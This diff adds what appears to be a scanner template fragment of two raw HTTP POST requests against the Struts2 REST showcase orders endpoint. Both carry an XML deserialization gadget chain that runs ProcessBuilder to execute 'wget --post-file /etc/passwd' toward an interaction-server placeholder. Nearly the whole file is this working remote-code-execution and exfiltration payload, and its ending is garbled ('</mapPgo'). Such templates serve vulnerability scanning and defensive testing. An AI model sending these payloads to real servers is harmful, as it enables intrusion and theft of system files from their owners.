@@ -1,0 +1,134 @@
+POST /struts2-rest-showcase/orders/3 HTTP/1.1
+Host: {{HOST}}
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15
+Connection: close
+Content-Length: 2550
+Accept: */*
+Accept-Language: en
+Content-Type: application/xml
+Accept-Encoding: gzip
+
+<map>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString>
+      <flags>0</flags>
+      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+        <dataHandler>
+          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
+            <is class="javax.crypto.CipherInputStream">
+              <cipher class="javax.crypto.NullCipher">
+                <initialized>false</initialized>
+                <opmode>0</opmode>
+                <serviceIterator class="javax.imageio.spi.FilterIterator">
+                  <iter class="javax.imageio.spi.FilterIterator">
+                    <iter class="java.util.Collections$EmptyIterator"/>
+                    <next class="java.lang.ProcessBuilder">
+                      <command>
+                        <string>wget</string>
+                        <string>--post-file</string>
+                        <string>/etc/passwd</string>
+              <string>{{interac}}</string>
+                      </command>
+                      <redirectErrorStream>false</redirectErrorStream>
+                    </next>
+                  </iter>
+                  <filter class="javax.imageio.ImageIO$ContainsFilter">
+                    <method>
+                      <class>java.lang.ProcessBuilder</class>
+                      <name>start</name>
+                      <parameter-types/>
+                    </method>
+                    <name>asdasd</name>
+                  </filter>
+                  <next class="string">asdasd</next>
+                </serviceIterator>
+                <lock/>
+              </cipher>
+              <input class="java.lang.ProcessBuilder$NullInputStream"/>
+              <ibuffer></ibuffer>
+              <done>false</done>
+              <ostart>0</ostart>
+              <ofinish>0</ofinish>
+              <closed>false</closed>
+            </is>
+            <consumed>false</consumed>
+          </dataSource>
+          <transferFlavors/>
+        </dataHandler>
+        <dataLen>0</dataLen>
+      </value>
+    </jdk.nashorn.internal.objects.NativeString>
+    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
+  </entry>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+  </entry>
+</map>
+", "POST /orders/3 HTTP/1.1
+Host: {{HOST}}
+User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14816.131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 2550
+Accept: */*
+Accept-Language: en
+Content-Type: application/xml
+Accept-Encoding: gzip
+
+<map>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString>
+      <flags>0</flags>
+      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+        <dataHandler>
+          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
+            <is class="javax.crypto.CipherInputStream">
+              <cipher class="javax.crypto.NullCipher">
+                <initialized>false</initialized>
+                <opmode>0</opmode>
+                <serviceIterator class="javax.imageio.spi.FilterIterator">
+                  <iter class="javax.imageio.spi.FilterIterator">
+                    <iter class="java.util.Collections$EmptyIterator"/>
+                    <next class="java.lang.ProcessBuilder">
+                      <command>
+                        <string>wget</string>
+                        <string>--post-file</string>
+                        <string>/etc/passwd</string>
+              <string>{{interac}}</string>
+                      </command>
+                      <redirectErrorStream>false</redirectErrorStream>
+                    </next>
+                  </iter>
+                  <filter class="javax.imageio.ImageIO$ContainsFilter">
+                    <method>
+                      <class>java.lang.ProcessBuilder</class>
+                      <name>start</name>
+                      <parameter-types/>
+                    </method>
+                    <name>asdasd</name>
+                  </filter>
+                  <next class="string">asdasd</next>
+                </serviceIterator>
+                <lock/>
+              </cipher>
+              <input class="java.lang.ProcessBuilder$NullInputStream"/>
+              <ibuffer></ibuffer>
+              <done>false</done>
+              <ostart>0</ostart>
+              <ofinish>0</ofinish>
+              <closed>false</closed>
+            </is>
+            <consumed>false</consumed>
+          </dataSource>
+          <transferFlavors/>
+        </dataHandler>
+        <dataLen>0</dataLen>
+      </value>
+    </jdk.nashorn.internal.objects.NativeString>
+    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
+  </entry>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+  </entry>
+</mapPgo
